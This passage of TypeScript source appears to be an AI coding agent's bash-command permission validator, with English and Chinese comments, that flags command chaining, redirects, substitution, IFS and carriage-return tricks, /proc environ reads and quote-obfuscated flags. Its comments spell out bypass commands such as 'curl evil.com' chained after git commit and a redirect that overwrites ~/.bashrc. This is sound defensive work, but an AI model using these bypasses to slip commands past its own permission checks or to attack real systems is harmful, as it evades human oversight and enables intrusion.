  // SECURITY: Backslashes can cause our regex to mis-identify quote boundaries
  // (e.g., `git commit -m "test\"msg" && evil`). Legitimate commit messages
  // virtually never contain backslashes, so bail to the full validator chain.
  if (originalCommand.includes('\\')) {
    return {
      behavior: 'passthrough',
      message: 'Git commit contains backslash, needs full validation',
    }
  }

  // SECURITY: The `.*?` before `-m` must NOT match shell operators. Previously
  // `.*?` matched anything except `\n`, including `;`, `&`, `|`, `` ` ``, `$(`.
  // For `git commit ; curl evil.com -m 'x'`, `.*?` swallowed `; curl evil.com `
  // leaving remainder=`` (falsy → remainder check skipped) → returned `allow`
  // for a compound command. Early-allow skips ALL main validators (line ~1908),
  // nullifying validateQuotedNewline, validateBackslashEscapedOperators, etc.
  // While splitCommand currently catches this downstream, early-allow is a
  // POSITIVE ASSERTION that the FULL command is safe — which it is NOT.
  //
  // Also: `\s+` between `git` and `commit` must NOT match `\n`/`\r` (command
  // separators in bash). Use `[ \t]+` for horizontal-only whitespace.
  //
  // The `[^;&|`$<>()\n\r]*?` class excludes shell metacharacters. We also
  // exclude `<` and `>` here (redirects) — they're allowed in the REMAINDER
  // for `--author="Name <email>"` but must not appear BEFORE `-m`.
  const messageMatch = originalCommand.match(
    /^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/,
  )

  if (messageMatch) {
    const [, quote, messageContent, remainder] = messageMatch

    if (quote === '"' && messageContent && /\$\(|`|\$\{/.test(messageContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.GIT_COMMIT_SUBSTITUTION,
        subId: 1,
      })
      return {
        behavior: 'ask',
        message: 'Git commit message contains command substitution patterns',
      }
    }

    // SECURITY: Check remainder for shell operators that could chain commands
    // or redirect output. The `.*` before `-m` in the regex can swallow flags
    // like `--amend`, leaving `&& evil` or `> ~/.bashrc` in the remainder.
    // Previously we only checked for $() / `` / ${} here, missing operators
    // like ; | & && || < >.
    //
    // `<` and `>` can legitimately appear INSIDE quotes in --author values
    // like `--author="Name <email>"`. An UNQUOTED `>` is a shell redirect
    // operator. Because validateGitCommit is an EARLY validator, returning
    // `allow` here short-circuits bashCommandIsSafe and SKIPS
    // validateRedirections. So we must bail to passthrough on unquoted `<>`
    // to let the main validators handle it.
    //
    // Attack: `git commit --allow-empty -m 'payload' > ~/.bashrc`
    //   validateGitCommit returns allow → bashCommandIsSafe short-circuits →
    //   validateRedirections NEVER runs → ~/.bashrc overwritten with git
    //   stdout containing `payload` → RCE on next shell login.
    if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
      return {
        behavior: 'passthrough',
        message: 'Git commit remainder contains shell metacharacters',
      }
    }
    if (remainder) {
      // Strip quoted content, then check for `<` or `>`. Quoted `<>` (email
      // brackets in --author) are safe; unquoted `<>` are shell redirects.
      // NOTE: This simple quote tracker has NO backslash handling. `\'`/`\"`
      // outside quotes would desync it (bash: \' = literal ', tracker: toggles
      // SQ). BUT line 584 already bailed on ANY backslash in originalCommand,
      // so we never reach here with backslashes. For backslash-free input,
      // simple quote toggling is correct (no way to escape quotes without \\).
      let unquoted = ''
      let inSQ = false
      let inDQ = false
      for (let i = 0; i < remainder.length; i++) {
        const c = remainder[i]
        if (c === "'" && !inDQ) {
          inSQ = !inSQ
          continue
        }
        if (c === '"' && !inSQ) {
          inDQ = !inDQ
          continue
        }
        if (!inSQ && !inDQ) unquoted += c
      }
      if (/[<>]/.test(unquoted)) {
        return {
          behavior: 'passthrough',
          message: 'Git commit remainder contains unquoted redirect operator',
        }
      }
    }

    // Security hardening: block messages starting with dash
    // This catches potential obfuscation patterns like git commit -m "---"
    if (messageContent && messageContent.startsWith('-')) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
        subId: 5,
      })
      return {
        behavior: 'ask',
        message: 'Command contains quoted characters in flag names',
      }
    }

    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason: 'Git commit with simple quoted message is allowed',
      },
    }
  }

  return { behavior: 'passthrough', message: 'Git commit needs validation' }
}

/**
 * 【做什么】jq 的专项检查
 * 【为什么需要】jq 有 system() 函数可以**执行任意命令**，还有一批能把外部文件读进变量的 flag
 * 【返回】ask（命中危险用法）/ passthrough
 */
function validateJqCommand(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'jq') {
    return { behavior: 'passthrough', message: 'Not jq' }
  }

  // jq 的 system() 会把它收到的字符串交给 shell 执行——等于在 jq 里开了个后门
  if (/\bsystem\s*\(/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_SYSTEM_FUNCTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'jq command contains system() function which executes arbitrary commands',
    }
  }

  // File arguments are now allowed - they will be validated by path validation in readOnlyValidation.ts
  // Only block dangerous flags that could read files into jq variables
  const afterJq = originalCommand.substring(3).trim()
  if (
    /(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(
      afterJq,
    )
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_FILE_ARGUMENTS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'jq command contains dangerous flags that could execute code or read arbitrary files',
    }
  }

  return { behavior: 'passthrough', message: 'jq command is safe' }
}

// 检查「引号里包裹的 ; | &」这类写法：单独看被引号包住，但在某些命令（find -name 等）里
//   会被重新解释为命令分隔符。宁可多问一次
function validateShellMetacharacters(
  context: ValidationContext,
): PermissionResult {
  const { unquotedContent } = context
  const message =
    'Command contains shell metacharacters (;, |, or &) in arguments'

  if (/(?:^|\s)["'][^"']*[;&][^"']*["'](?:\s|$)/.test(unquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 1,
    })
    return { behavior: 'ask', message }
  }

  const globPatterns = [
    /-name\s+["'][^"']*[;|&][^"']*["']/,
    /-path\s+["'][^"']*[;|&][^"']*["']/,
    /-iname\s+["'][^"']*[;|&][^"']*["']/,
  ]

  if (globPatterns.some(p => p.test(unquotedContent))) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 2,
    })
    return { behavior: 'ask', message }
  }

  if (/-regex\s+["'][^"']*[;&][^"']*["']/.test(unquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 3,
    })
    return { behavior: 'ask', message }
  }

  return { behavior: 'passthrough', message: 'No metacharacters' }
}

// 变量出现在重定向或管道附近（如 `> $OUT`、`$CMD | sh`）时，
//   变量展开后的真实内容静态无法得知，属于「无法判定」的情形 → ask
function validateDangerousVariables(
  context: ValidationContext,
): PermissionResult {
  const { fullyUnquotedContent } = context

  if (
    /[<>|]\s*\$[A-Za-z_]/.test(fullyUnquotedContent) ||
    /\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]/.test(fullyUnquotedContent)
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_VARIABLES,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains variables in dangerous contexts (redirections or pipes)',
    }
  }

  return { behavior: 'passthrough', message: 'No dangerous variables' }
}

/**
 * 【做什么】扫描命令替换 / 进程替换等危险语法
 * 【为什么需要】这些语法都会让 bash 执行「另一段命令」，而那段命令不会出现在我们的命令表里
 * 【关键步骤】
 *   ① 反引号要区分「转义过的」与「未转义的」（hasUnescapedChar）
 *   ② 其余模式逐个匹配 COMMAND_SUBSTITUTION_PATTERNS
 */
function validateDangerousPatterns(
  context: ValidationContext,
): PermissionResult {
  const { unquotedContent } = context

  // Special handling for backticks - check for UNESCAPED backticks only
  // Escaped backticks (e.g., \`) are safe and commonly used in SQL commands
  if (hasUnescapedChar(unquotedContent, '`')) {
    return {
      behavior: 'ask',
      message: 'Command contains backticks (`) for command substitution',
    }
  }

  // Other command substitution checks (include double-quoted content)
  for (const { pattern, message } of COMMAND_SUBSTITUTION_PATTERNS) {
    if (pattern.test(unquotedContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId:
          BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION,
        subId: 1,
      })
      return { behavior: 'ask', message: `Command contains ${message}` }
    }
  }

  return { behavior: 'passthrough', message: 'No dangerous patterns' }
}

// 输入重定向 < 可以读任意文件、输出重定向 > 可以写任意文件。
//   注意这个验证器属于「非解析器差异」类（LF 与重定向 splitCommand 能正确处理），
//   所以它的 ask 不带 isBashSecurityCheckForMisparsing，走标准权限流程
function validateRedirections(context: ValidationContext): PermissionResult {
  const { fullyUnquotedContent } = context

  if (/</.test(fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_INPUT_REDIRECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains input redirection (<) which could read sensitive files',
    }
  }

  if (/>/.test(fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_OUTPUT_REDIRECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains output redirection (>) which could write to arbitrary files',
    }
  }

  return { behavior: 'passthrough', message: 'No redirections' }
}

/**
 * 【做什么】检查换行后面是否跟着「看起来像新命令」的内容
 * 【为什么需要】换行在 bash 里就是命令分隔符，一条「多行命令」可能藏着第二条命令
 * 【关键步骤】
 *   ① 用 fullyUnquotedPreStrip（清洗前的版本），避免清洗动作本身造出假的 \\+换行 续行
 *   ② 允许「空白 + 反斜杠 + 换行」这种行续接写法（bash 会把它俩一起删掉）
 *   ③ 但**词中**续接（tr\<换行>aceroute）不放行——它能把危险命令名藏起来
 */
function validateNewlines(context: ValidationContext): PermissionResult {
  // Use fullyUnquotedPreStrip (before stripSafeRedirections) to prevent bypasses
  // where stripping `>/dev/null` creates a phantom backslash-newline continuation.
  // E.g., `cmd \>/dev/null\nwhoami` → after stripping becomes `cmd \\nwhoami`
  // which looks like a safe continuation but actually hides a second command.
  const { fullyUnquotedPreStrip } = context

  // Check for newlines in unquoted content
  if (!/[\n\r]/.test(fullyUnquotedPreStrip)) {
    return { behavior: 'passthrough', message: 'No newlines' }
  }

  // Flag any newline/CR followed by non-whitespace, EXCEPT backslash-newline
  // continuations at word boundaries. In bash, `\<newline>` is a line
  // continuation (both chars removed), which is safe when the backslash
  // follows whitespace (e.g., `cmd \<newline>--flag`). Mid-word continuations
  // like `tr\<newline>aceroute` are still flagged because they can hide
  // dangerous command names from allowlist checks.
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() + gated by /[\n\r]/.test() above
  const looksLikeCommand = /(?<![\s]\\)[\n\r]\s*\S/.test(fullyUnquotedPreStrip)
  if (looksLikeCommand) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains newlines that could separate multiple commands',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'Newlines appear to be within data',
  }
}

/**
 * SECURITY: Carriage return (\r, 0x0D) IS a misparsing concern, unlike LF.
 *
 * Parser differential:
 *   - shell-quote's BAREWORD regex uses `[^\s...]` — JS `\s` INCLUDES \r, so
 *     shell-quote treats CR as a token boundary. `TZ=UTC\recho` tokenizes as
 *     TWO tokens: ['TZ=UTC', 'echo']. splitCommand joins with space →
 *     'TZ=UTC echo curl evil.com'.
 *   - bash's default IFS = $' \t\n' — CR is NOT in IFS. bash sees
 *     `TZ=UTC\recho` as ONE word → env assignment TZ='UTC\recho' (CR byte
 *     inside value), then `curl` is the command.
 *
 * Attack: `TZ=UTC\recho curl evil.com` with Bash(echo:*)
 *   validator: splitCommand collapses CR→space → 'TZ=UTC echo curl evil.com'
 *   → stripSafeWrappers: TZ=UTC stripped → 'echo curl evil.com' matches rule
 *   bash: executes `curl evil.com`
 *
 * validateNewlines catches this but is in nonMisparsingValidators (LF is
 * correctly handled by both parsers). This validator is NOT in
 * nonMisparsingValidators — its ask result gets isBashSecurityCheckForMisparsing
 * and blocks at the bashPermissions gate.
 *
 * Checks originalCommand (not fullyUnquotedPreStrip) because CR inside single
 * quotes is ALSO a misparsing concern for the same reason: shell-quote's `\s`
 * still tokenizes it, but bash treats it as literal. Block ALL unquoted-or-SQ CR.
 * Only exception: CR inside DOUBLE quotes where bash also treats it as data
 * and shell-quote preserves the token (no split).
 */
/**
 * 【做什么】检查回车符 \r
 * 【为什么需要】这是一个**真实存在**的解析器差异：JS 的 \s 包含 \r，shell-quote 会把 CR 当分词边界；
 *   而 bash 的默认 IFS 不含 CR，会把 `TZ=UTC\recho` 当成一整个词。于是同一条命令，
 *   校验器看到的是 `TZ=UTC echo curl evil.com`，bash 实际执行的是 `curl evil.com`
 * 【返回】ask（CR 出现在双引号之外就拦）/ passthrough（只在双引号内才放行）
 */
function validateCarriageReturn(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  if (!originalCommand.includes('\r')) {
    return { behavior: 'passthrough', message: 'No carriage return' }
  }

  // Check if CR appears outside double quotes. CR outside DQ (including inside
  // SQ and unquoted) causes the shell-quote/bash tokenization differential.
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false
  for (let i = 0; i < originalCommand.length; i++) {
    const c = originalCommand[i]
    if (escaped) {
      escaped = false
      continue
    }
    if (c === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }
    if (c === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
    if (c === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }
    if (c === '\r' && !inDoubleQuote) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
        subId: 2,
      })
      return {
        behavior: 'ask',
        message:
          'Command contains carriage return (\\r) which shell-quote and bash tokenize differently',
      }
    }
  }

  return { behavior: 'passthrough', message: 'CR only inside double quotes' }
}

// IFS 是 bash 的「字段分隔符」变量。改掉它就能改变分词行为，
//   从而让我们基于空格分词的判断全部失效 —— 所以只要命令里出现 IFS 相关引用就要求确认
function validateIFSInjection(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  // Detect any usage of IFS variable which could be used to bypass regex validation
  // Check for $IFS and ${...IFS...} patterns (including parameter expansions like ${IFS:0:1}, ${#IFS}, etc.)
  // Using ${[^}]*IFS to catch all parameter expansion variations with IFS
  if (/\$IFS|\$\{[^}]*IFS/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.IFS_INJECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains IFS variable usage which could bypass security validation',
    }
  }

  return { behavior: 'passthrough', message: 'No IFS injection detected' }
}

// Additional hardening against reading environment variables via /proc filesystem.
// Path validation typically blocks /proc access, but this provides defense-in-depth.
// Environment files in /proc can expose sensitive data like API keys and secrets.
// /proc/<pid>/environ 里存着进程的**环境变量**（常含 API key、token 等敏感信息）。
//   路径校验通常也会拦 /proc，这里是额外一层防御（defense-in-depth）
function validateProcEnvironAccess(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  // Check for /proc paths that could expose environment variables
  // This catches patterns like:
  // - /proc/self/environ
  // - /proc/1/environ
  // - /proc/*/environ (with any PID)
  if (/\/proc\/.*\/environ/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.PROC_ENVIRON_ACCESS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command accesses /proc/*/environ which could expose sensitive environment variables',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No /proc/environ access detected',
  }
}

/**
 * Detects commands with malformed tokens (unbalanced delimiters) combined with
 * command separators. This catches potential injection patterns where ambiguous
 * shell syntax could be exploited.
 *
 * Security: This check catches the eval bypass discovered in HackerOne review.
 * When shell-quote parses ambiguous patterns like `echo {"hi":"hi;evil"}`,
 * it may produce unbalanced tokens (e.g., `{hi:"hi`). Combined with command
 * separators, this can lead to unintended command execution via eval re-parsing.
 *
 * By forcing user approval for these patterns, we ensure the user sees exactly
 * what will be executed before approving.
 */
/**
 * 【做什么】检查「分词结果里出现畸形 token（括号/引号不配对）」且同时存在命令分隔符的情形
 * 【为什么需要】畸形 token 说明连分词器都没能确定语义，再叠加分隔符就可能被 eval 类操作
 *   重新解析成完全不一样的命令（这是 HackerOne 评审中发现的 eval 绕过）
 */
function validateMalformedTokenInjection(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  const parseResult = tryParseShellCommand(originalCommand)
  if (!parseResult.success) {
    // Parse failed - this is handled elsewhere (bashToolHasPermission checks this)
    return {
      behavior: 'passthrough',
      message: 'Parse failed, handled elsewhere',
    }
  }

  const parsed = parseResult.tokens

  // Check for command separators (;, &&, ||)
  const hasCommandSeparator = parsed.some(
    entry =>
      typeof entry === 'object' &&
      entry !== null &&
      'op' in entry &&
      (entry.op === ';' || entry.op === '&&' || entry.op === '||'),
  )

  if (!hasCommandSeparator) {
    return { behavior: 'passthrough', message: 'No command separators' }
  }

  // Check for malformed tokens (unbalanced delimiters)
  if (hasMalformedTokens(originalCommand, parsed)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.MALFORMED_TOKEN_INJECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains ambiguous syntax with command separators that could be misinterpreted',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No malformed token injection detected',
  }
}

/**
 * 【做什么】检测「用引号把 flag 藏起来」的各种写法
 * 【为什么需要】我们拦危险 flag 主要靠「以 - 开头的词」这种判断；而 bash 里
 *   `""-exec`、`$''-exec`、`'-'exec`、`'-'"exec"` 这些拼接写法最终都会变成 -exec，
 *   却不以 - 开头 → 轻松绕过。本函数是整个文件里最长的一个，因为绕过形态实在太多
 * 【返回】ask（疑似混淆）/ passthrough
 * 【关键步骤】
 *   ① echo 且无 shell 操作符时直接跳过（echo 没有危险 flag，避免误报）
 *   ② 拦 ANSI-C 引用 $'...' 与本地化引用 $"..."（能把任意字符编码出来）
 *   ③ 拦「空引号 + 短横」以及「空引号对紧邻带引号的 -」等组合
 *   ④ 逐字符跟踪引号状态，找出「空白 + 引号 + 以 - 开头的内容」
 *   ⑤ 还要处理「引号链」："-""exec" 这种多段拼接在 bash 里等于 -exec
 *   ⑥ 最后再对「去引号后的文本」做两条兜底正则
 */
function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
  // Block shell quoting bypass patterns used to circumvent negative lookaheads we use in our regexes to block known dangerous flags

  const { originalCommand, baseCommand } = context

  // Echo is safe for obfuscated flags, BUT only for simple echo commands.
  // For compound commands (with |, &, ;), we need to check the whole command
  // because the dangerous ANSI-C quoting might be after the operator.
  const hasShellOperators = /[|&;]/.test(originalCommand)
  if (baseCommand === 'echo' && !hasShellOperators) {
    return {
      behavior: 'passthrough',
      message: 'echo command is safe and has no dangerous flags',
    }
  }

  // COMPREHENSIVE OBFUSCATION DETECTION
  // These checks catch various ways to hide flags using shell quoting

  // 1. Block ANSI-C quoting ($'...') - can encode any character via escape sequences
  // Simple pattern that matches $'...' anywhere. This correctly handles:
  // - grep '$' file => no match ($ is regex anchor inside quotes, no $'...' structure)
  // - 'test'$'-exec' => match (quote concatenation with ANSI-C)
  // - Zero-width space and other invisible chars => match
  // The pattern requires $' followed by content (can be empty) followed by closing '
  if (/\$'[^']*'/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 5,
    })
    return {
      behavior: 'ask',
      message: 'Command contains ANSI-C quoting which can hide characters',
    }
  }

  // 2. Block locale quoting ($"...")  - can also use escape sequences
  // Same simple pattern as ANSI-C quoting above
  if (/\$"[^"]*"/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 6,
    })
    return {
      behavior: 'ask',
      message: 'Command contains locale quoting which can hide characters',
    }
  }

  // 3. Block empty ANSI-C or locale quotes followed by dash
  // $''-exec or $""-exec
  if (/\$['"]{2}\s*-/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 9,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains empty special quotes before dash (potential bypass)',
    }
  }

  // 4. Block ANY sequence of empty quotes followed by dash
  // This catches: ''-  ""-  ''""-  ""''-  ''""''-  etc.
  // The pattern looks for one or more empty quote pairs followed by optional whitespace and dash
  if (/(?:^|\s)(?:''|"")+\s*-/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 7,
    })
    return {
      behavior: 'ask',
      message: 'Command contains empty quotes before dash (potential bypass)',
    }
  }

  // 4b. SECURITY: Block homogeneous empty quote pair(s) immediately adjacent
  // to a quoted dash. Patterns like `"""-f"` (empty `""` + quoted `"-f"`)
  // concatenate in bash to `-f` but slip past all the above checks:
  //   - Regex (4) above: `(?:''|"")+\s*-` matches `""` pair, then expects
  //     optional space and dash — but finds a third `"` instead. No match.
  //   - Quote-content scanner (below): Sees the first `""` pair with empty
  //     content (doesn't start with dash). The third `"` opens a new quoted
  //     region handled by the main quote-state tracker.
  //   - Quote-state tracker: `""` toggles inDoubleQuote on/off; third `"`
  //     opens it again. The `-` inside `"-f"` is INSIDE quotes → skipped.
  //   - Flag scanner: Looks for `\s` before `-`. The `-` is preceded by `"`.
  //   - fullyUnquotedContent: Both `""` and `"-f"` get stripped.
  //
  // In bash, `"""-f"` = empty string + string "-f" = `-f`. This bypass works
  // for ANY dangerous-flag check (jq -f, find -exec, fc -e) with a matching
  // prefix permission (Bash(jq:*), Bash(find:*)).
  //
  // The regex `(?:""|'')+['"]-` matches:
  //   - One or more HOMOGENEOUS empty pairs (`""` or `''`) — the concatenation
  //     point where bash joins the empty string to the flag.
  //   - Immediately followed by ANY quote char — opens the flag-quoted region.
  //   - Immediately followed by `-` — the obfuscated flag.
  //
  // POSITION-AGNOSTIC: We do NOT require word-start (`(?:^|\s)`) because
  // prefixes like `$x"""-f"` (unset/empty variable) concatenate the same way.
  // The homogeneous-empty-pair requirement filters out the `'"'"'` idiom
  // (no homogeneous empty pair — it's close, double-quoted-content, open).
  //
  // FALSE POSITIVE: Matches `echo '"""-f" text'` (pattern inside single-quoted
  // string). Extremely rare (requires echoing the literal attack). Acceptable.
  if (/(?:""|'')+['"]-/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 10,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains empty quote pair adjacent to quoted dash (potential flag obfuscation)',
    }
  }

  // 4c. SECURITY: Also block 3+ consecutive quotes at word start even without
  // an immediate dash. Broader safety net for multi-quote obfuscation patterns
  // not enumerated above (e.g., `"""x"-f` where content between quotes shifts
  // the dash position). Legitimate commands never need `"""x"` when `"x"` works.
  if (/(?:^|\s)['"]{3,}/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 11,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains consecutive quote characters at word start (potential obfuscation)',
    }
  }

  // Track quote state to avoid false positives for flags inside quoted strings
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < originalCommand.length - 1; i++) {
    const currentChar = originalCommand[i]
    const nextChar = originalCommand[i + 1]

    // Update quote state
    if (escaped) {
      escaped = false
      continue
    }

    // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
    // `\` inside `'...'` is LITERAL. Without this guard, `'\'` desyncs the
    // quote tracker: `\` sets escaped=true, closing `'` is consumed by the
    // escaped-skip above instead of toggling inSingleQuote. Parser stays in
    // single-quote mode, and the `if (inSingleQuote || inDoubleQuote) continue`
    // at line ~1121 skips ALL subsequent flag detection for the rest of the
    // command. Example: `jq '\' "-f" evil` — bash gets `-f` arg, but desynced
    // parser thinks ` "-f" evil` is inside quotes → flag detection bypassed.
    // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns at
    // line ~1856 before this runs. But we fix the tracker for consistency with
    // the CORRECT implementations elsewhere in this file (hasBackslashEscaped*,
    // extractQuotedContent) which all guard with `!inSingleQuote`.
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // Only look for flags when not inside quoted strings
    // This prevents false positives like: make test TEST="file.py -v"
    if (inSingleQuote || inDoubleQuote) {
      continue
    }

    // Look for whitespace followed by quote that contains a dash (potential flag obfuscation)
    // SECURITY: Block ANY quoted content starting with dash - err on side of safety
    // Catches: "-"exec, "-file", "--flag", '-'output, etc.
    // Users can approve manually if legitimate (e.g., find . -name "-file")
    if (
      currentChar &&
      nextChar &&
      /\s/.test(currentChar) &&
      /['"`]/.test(nextChar)
    ) {
      const quoteChar = nextChar
      let j = i + 2 // Start after the opening quote
      let insideQuote = ''

      // Collect content inside the quote
      while (j < originalCommand.length && originalCommand[j] !== quoteChar) {
        insideQuote += originalCommand[j]!
        j++
      }

      // If we found a closing quote and the content looks like an obfuscated flag, block it.
      // Three attack patterns to catch:
      //   1. Flag name inside quotes: "--flag", "-exec", "-X" (dashes + letters inside)
      //   2. Split-quote flag: "-"exec, "--"output (dashes inside, letters continue after quote)
      //   3. Chained quotes: "-""exec" (dashes in first quote, second quote contains letters)
      // Pure-dash strings like "---" or "--" followed by whitespace/separator are separators,
      // not flags, and should not trigger this check.
      const charAfterQuote = originalCommand[j + 1]
      // Inside double quotes, $VAR and `cmd` expand at runtime, so "-$VAR" can
      // become -exec. Blocking $ and ` here over-blocks single-quoted literals
      // like grep '-$' (where $ is literal), but main's startsWith('-') already
      // blocked those — this restores status quo, not a new false positive.
      // Brace expansion ({) does NOT happen inside quotes, so { is not needed here.
      const hasFlagCharsInside = /^-+[a-zA-Z0-9$`]/.test(insideQuote)
      // Characters that can continue a flag after a closing quote. This catches:
      //   a-zA-Z0-9: "-"exec → -exec (direct concatenation)
      //   \\:        "-"\exec → -exec (backslash escape is stripped)
      //   -:         "-"-output → --output (extra dashes)
      //   {:         "-"{exec,delete} → -exec -delete (brace expansion)
      //   $:         "-"$VAR → -exec when VAR=exec (variable expansion)
      //   `:         "-"`echo exec` → -exec (command substitution)
      // Note: glob chars (*?[) are omitted — they require attacker-controlled
      // filenames in CWD to exploit, and blocking them would break patterns
      // like `ls -- "-"*` for listing files that start with dash.
      const FLAG_CONTINUATION_CHARS = /[a-zA-Z0-9\\${`-]/
      const hasFlagCharsContinuing =
        /^-+$/.test(insideQuote) &&
        charAfterQuote !== undefined &&
        FLAG_CONTINUATION_CHARS.test(charAfterQuote)
      // Handle adjacent quote chaining: "-""exec" or "-""-"exec or """-"exec concatenates
      // to -exec in shell. Follow the chain of adjacent quoted segments until
      // we find one containing an alphanumeric char or hit a non-quote boundary.
      // Also handles empty prefix quotes: """-"exec where "" is followed by "-"exec
      // The combined segments form a flag if they contain dash(es) followed by alphanumerics.
      const hasFlagCharsInNextQuote =
        // Trigger when: first segment is only dashes OR empty (could be prefix for flag)
        (insideQuote === '' || /^-+$/.test(insideQuote)) &&
        charAfterQuote !== undefined &&
        /['"`]/.test(charAfterQuote) &&
        (() => {
          let pos = j + 1 // Start at charAfterQuote (an opening quote)
          let combinedContent = insideQuote // Track what the shell will see
          while (
            pos < originalCommand.length &&
            /['"`]/.test(originalCommand[pos]!)
          ) {
            const segQuote = originalCommand[pos]!
            let end = pos + 1
            while (
              end < originalCommand.length &&
              originalCommand[end] !== segQuote
            ) {
              end++
            }
            const segment = originalCommand.slice(pos + 1, end)
            combinedContent += segment

            // Check if combined content so far forms a flag pattern.
            // Include $ and ` for in-quote expansion: "-""$VAR" → -exec
            if (/^-+[a-zA-Z0-9$`]/.test(combinedContent)) return true

            // If this segment has alphanumeric/expansion and we already have dashes,
            // it's a flag. Catches "-""$*" where segment='$*' has no alnum but
            // expands to positional params at runtime.
            // Guard against segment.length === 0: slice(0, -0) → slice(0, 0) → ''.
            const priorContent =
              segment.length > 0
                ? combinedContent.slice(0, -segment.length)
                : combinedContent
            if (/^-+$/.test(priorContent)) {
              if (/[a-zA-Z0-9$`]/.test(segment)) return true
            }

            if (end >= originalCommand.length) break // Unclosed quote
            pos = end + 1 // Move past closing quote to check next segment
          }
          // Also check the unquoted char at the end of the chain
          if (
            pos < originalCommand.length &&
            FLAG_CONTINUATION_CHARS.test(originalCommand[pos]!)
          ) {
            // If we have dashes in combined content, the trailing char completes a flag
            if (/^-+$/.test(combinedContent) || combinedContent === '') {
              // Check if we're about to form a flag with the following content
